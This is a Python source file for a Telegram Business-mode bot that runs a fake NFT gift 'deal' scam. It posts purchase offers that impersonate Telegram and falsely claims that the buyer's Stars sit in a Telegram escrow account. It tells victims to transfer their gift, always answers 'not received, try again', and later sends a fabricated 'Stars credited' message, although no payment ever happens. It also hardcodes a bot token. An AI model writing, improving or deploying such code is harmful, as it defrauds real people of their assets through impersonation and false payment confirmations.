# bot.py — NFT Deal Bot | aiogram 3.7+ | Business Mode
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, Message,
    LinkPreviewOptions
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

TOKEN    = "8469717125:AAEbUIanMZltA742IAXyLU7x79QcAtlTMZA"
ADMIN_ID = 741904495

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher()

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    chat_id         INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    status          TEXT DEFAULT 'offer',
    created_at      TEXT,
    biz_id          TEXT,
    offer_msg_id    INTEGER,
    sent_at         TEXT
);
""")
db.commit()


def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


def parse_nft(url: str):
    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
    return (m.group(1), m.group(2)) if m else (None, None)


def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None


def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()


def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."


# ── Тексты ───────────────────────────────────────────────────
def offer_text(d: dict) -> str:
    return (
        f"Пользователь предлагает вам "
        f"<b>{d['amount']:,} Звёзд</b> за подарок "
        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(d['sent_at'])}</b>"
    )


def deal_text(d: dict) -> str:
    return (
        f"Ордер <b>#{d['order_id']}</b>\n\n"
        f"Покупатель зарезервировал <b>{d['amount']:,} ⭐️ Звёзд</b> через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{d['amount']:,} ⭐️ Звёзд</b> на ваш баланс. Резерв действует 24 часа."
    )


# ── Клавиатуры ───────────────────────────────────────────────
def offer_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}")
    )
    return kb.as_markup()


def deal_kb(d: dict):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="Передать NFT ↗",
        url=f"tg://send_gift?to={d['buyer_username']}"
    ))
    kb.row(InlineKeyboardButton(
        text="Подтвердить передачу",
        callback_data=f"confirm:{d['order_id']}"
    ))
    return kb.as_markup()


def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()


def lp(nft_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(
        url=nft_url,
        show_above_text=True,
        prefer_large_media=True
    )


# ── Таймер оффера ────────────────────────────────────────────
async def offer_timer(order_id: str):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d['status'] != 'offer':
            break
        deadline = datetime.fromisoformat(d['sent_at']) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status='expired')
            try:
                await bot.edit_message_text(
                    "Оффер истёк.",
                    business_connection_id=d['biz_id'] or None,
                    chat_id=d['chat_id'],
                    message_id=d['offer_msg_id'],
                    reply_markup=None
                )
            except Exception:
                pass
            break
        try:
            await bot.edit_message_text(
                offer_text(d),
                business_connection_id=d['biz_id'] or None,
                chat_id=d['chat_id'],
                message_id=d['offer_msg_id'],
                reply_markup=offer_kb(order_id),
                link_preview_options=lp(d['nft_url'])
            )
        except Exception:
            pass


# ── .buy ─────────────────────────────────────────────────────
@dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
@dp.business_message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
async def cmd_buy(message: Message):
    biz_id = message.business_connection_id

    if biz_id:
        try:
            biz_conn       = await bot.get_business_connection(biz_id)
            buyer_username = biz_conn.user.username or str(biz_conn.user.id)
        except Exception:
            buyer_username = "unknown"
    else:
        buyer_username = message.from_user.username or str(message.from_user.id)

    parts   = message.text.strip().split()
    nft_url = parts[1]
    amount  = int(parts[2])

    slug, num = parse_nft(nft_url)
    if not slug:
        return

    try:
        await bot.delete_message(
            chat_id=message.chat.id,
            message_id=message.message_id
        )
    except Exception:
        pass

    order_id = gen_order_id()
    chat_id  = message.chat.id
    sent_at  = datetime.now().isoformat()

    db.execute("""
        INSERT INTO deals
          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
           amount, status, created_at, biz_id, sent_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?, ?)
    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
          amount, sent_at, biz_id or "", sent_at))
    db.commit()

    d = get_deal(order_id)
    send_kw = {"business_connection_id": biz_id} if biz_id else {}

    try:
        msg = await bot.send_message(
            chat_id,
            offer_text(d),
            reply_markup=offer_kb(order_id),
            link_preview_options=lp(nft_url),
            **send_kw
        )
        upd(order_id, offer_msg_id=msg.message_id)
        asyncio.create_task(offer_timer(order_id))
        logging.info(f"offer sent ok: {order_id} chat={chat_id} biz={biz_id}")
    except Exception as e:
        logging.error(f"SEND OFFER ERROR: {e} | chat={chat_id} biz={biz_id}")


# ── Принять ──────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'offer':
        await call.answer("Оффер недоступен.", show_alert=True)
        return

    upd(order_id, status='active')
    await call.answer(
        "Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )

    biz_id = d['biz_id'] or None
    try:
        await bot.edit_message_text(
            deal_text(d),
            business_connection_id=biz_id,
            chat_id=d['chat_id'],
            message_id=d['offer_msg_id'],
            reply_markup=deal_kb(d),
            link_preview_options=lp(d['nft_url'])
        )
    except Exception as e:
        logging.error(f"edit to deal: {e}")


# ── Отклонить ────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='declined')
    await call.answer("Вы отклонили оффер.")

    biz_id = d['biz_id'] or None
    try:
        await bot.edit_message_text(
            "Оффер отклонён.",
            business_connection_id=biz_id,
            chat_id=d['chat_id'],
            message_id=d['offer_msg_id'],
            reply_markup=None
        )
    except Exception as e:
        logging.error(f"edit decline: {e}")


# ── Подтвердить передачу → сразу "не получен" + тихий пинг ──
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'active':
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    # всплывашка "не получен" в том же стиле что и алерт принятия
    await call.answer(
        "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
        show_alert=True
    )

    # тихо пингуем тебя
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 Попытка подтверждения\n\n"
            f"Ордер: <b>{d['order_id']}</b>\n"
            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
            f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
            f"Покупатель: @{d['buyer_username']}\n"
            f"Ссылка: {d['nft_url']}\n\n"
            f"Нажми если NFT реально передан:",
            reply_markup=admin_kb(order_id)
        )
    except Exception as e:
        logging.error(f"admin notify: {e}")


# ── Админ: подтвердить ───────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='completed')
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"Ордер {order_id} завершён.")

    biz_id = d['biz_id'] or None
    try:
        await bot.send_message(
            d['chat_id'],
            f"Передача подтверждена!\n\n"
            f"Ордер <b>{d['order_id']}</b>\n"
            f"<b>{d['amount']:,} ⭐️ Звёзд</b> зачислены на ваш баланс Telegram Stars.",
            business_connection_id=biz_id
        )
    except Exception as e:
        logging.error(e)


# ── Админ: не передан ────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status='active')
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)

    # меняем кнопку "Подтвердить передачу" на callback который покажет алерт
    biz_id = d['biz_id'] or None
    try:
        await bot.edit_message_reply_markup(
            business_connection_id=biz_id,
            chat_id=d['chat_id'],
            message_id=d['offer_msg_id'],
            reply_markup=deal_kb(d)
        )
    except Exception as e:
        logging.error(e)


# ── /start ───────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, command: CommandObject):
    await message.answer("👋")


async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(
        bot,
        skip_updates=True,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ]
    )


if __name__ == "__main__":
    asyncio.run(main())
